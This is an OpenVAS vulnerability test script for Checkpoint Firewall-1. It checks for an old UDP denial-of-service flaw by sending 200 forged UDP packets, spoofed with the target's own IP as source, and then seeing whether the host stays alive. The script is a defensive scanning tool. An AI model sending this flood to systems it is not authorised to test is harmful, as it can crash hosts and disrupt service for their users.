###############################################################################
# OpenVAS Vulnerability Test
# $Id: fw1_udp_DoS.nasl 10411 2018-07-05 10:15:10Z cfischer $
#
# Checkpoint Firewall-1 UDP denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11905");
  script_version("$Revision: 10411 $");
  script_tag(name:"last_modification", value:"$Date: 2018-07-05 12:15:10 +0200 (Thu, 05 Jul 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1419);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Checkpoint Firewall-1 UDP denial of service");
  script_category(ACT_FLOOD);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("global_settings.nasl");
  script_exclude_keys("keys/islocalhost", "keys/TARGET_IS_IPV6");

  script_tag(name:"solution", value:"If this is a FW-1, enable the antispoofing rule. Otherwise,
  contact your software vendor for a patch.");

  script_tag(name:"impact", value:"An attacker may use this flaw to shut down this server, thus
  preventing you from working properly.");

  script_tag(name:"affected", value:"This attack was known to work against Firewall-1 3.0, 4.0 or 4.1");

  script_tag(name:"summary", value:"The machine (or a router on the way) crashed when it was flooded by
  incorrect UDP packets.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

if( TARGET_IS_IPV6() ) exit( 0 );
if( islocalhost() ) exit( 0 );

# Ensure that the host is still up
start_denial();
sleep( 2 );
up = end_denial();
if( ! up ) exit( 0 );

id = rand() % 65535 + 1;
sp = rand() % 65535 + 1;
dp = rand() % 65535 + 1;

start_denial();

ip = forge_ip_packet( ip_v:4, ip_hl:5, ip_tos:0, ip_off:0,
                      ip_p:IPPROTO_UDP, ip_id:id, ip_ttl:0x40,
                      ip_src:get_host_ip() );
udp = forge_udp_packet( ip:ip, uh_sport:sp, uh_dport:dp, uh_ulen:8 + 1, data:"X" );

send_packet( udp, pcap_active:FALSE ) x 200;

alive = end_denial();

if( ! alive ) {
  security_message( port:0, proto:"udp" );
  set_kb_item( name:"Host/dead", value:TRUE );
  exit( 0 );
}

exit( 99 );
